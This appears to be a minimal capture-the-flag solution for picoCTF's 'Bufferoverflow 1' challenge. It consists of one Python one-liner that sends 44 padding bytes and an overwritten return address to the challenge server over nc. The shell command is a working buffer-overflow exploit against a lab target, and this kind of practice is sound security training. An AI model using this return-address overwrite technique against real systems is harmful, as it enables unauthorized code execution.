# Bufferoverflow 1



```shel
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\xf6\x91\x04\x08' + b'\n')" | nc saturn.picoctf.net 64232
```